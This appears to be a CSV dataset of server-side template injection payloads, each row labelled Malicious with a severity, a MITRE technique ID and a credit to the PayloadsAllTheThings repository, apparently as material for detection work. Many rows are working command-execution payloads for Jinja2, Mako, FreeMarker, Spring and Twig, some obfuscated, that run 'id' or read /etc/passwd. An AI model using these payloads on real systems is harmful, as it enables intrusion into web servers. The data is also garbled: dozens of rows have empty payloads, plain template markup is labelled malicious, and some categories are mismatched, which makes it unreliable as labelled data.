",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${{<%[%'""}}%\.",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- """,CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- """,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% csrf_token %} # Causes error with Jinja2,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ 7*7 }}  # Error with Django Templates,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% debug %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ messages.storages.0.signer.key }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% include 'admin/base.html' %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% load log %}{% get_admin_log 10 as log %}{% for e in log %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{e.user.get_username}} : {{e.user.password}}{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% get_admin_log 10 as admin_log for_user user %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{4*4}}[[5*5]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}} would result in 7777777,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% extends """"layout.html"""" %}""",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% block body %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% for user in users %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<li><a href=""{{ user.url }}"">{{ user.username }}</a></li>",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endblock %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<pre>{% debug %}</pre>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self.__init__.__globals__.__builtins__ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<dt>{{ key|e }}</dt>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<dd>{{ value|e }}</dd>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{% endfor %},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/tmp/flag"").read() }}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ cycler.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ joiner.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ namespace.__init__.__globals__.os.popen('id').read() }},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{ lipsum.__globals__[""os""].popen('id').read() }}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ config.from_pyfile('/tmp/evilconfig.cfg') }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${x},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
">>> print(Template(""${self.module.cache.util.os}"").render())",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${ },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{4*4}}[[5*5]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{7*'7'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<%= 7 * 7 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${{7*7}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
@(1+2),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#{ 7 * 7 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${self.__init__.__globals__['util'].os.system('id')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
${self.template.__init__.__globals__['os'].system('id')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.filters.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.context._with_template.module.runtime.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.cache.util.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.util.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.traceback.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.module.runtime.exceptions.util.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.cache.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.template.module.cache.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.filters.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template._mmarker.module.runtime.exceptions.util.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.filters.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"${self.template.module.runtime.compat.inspect.linecache.os.system(""id"")}",CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
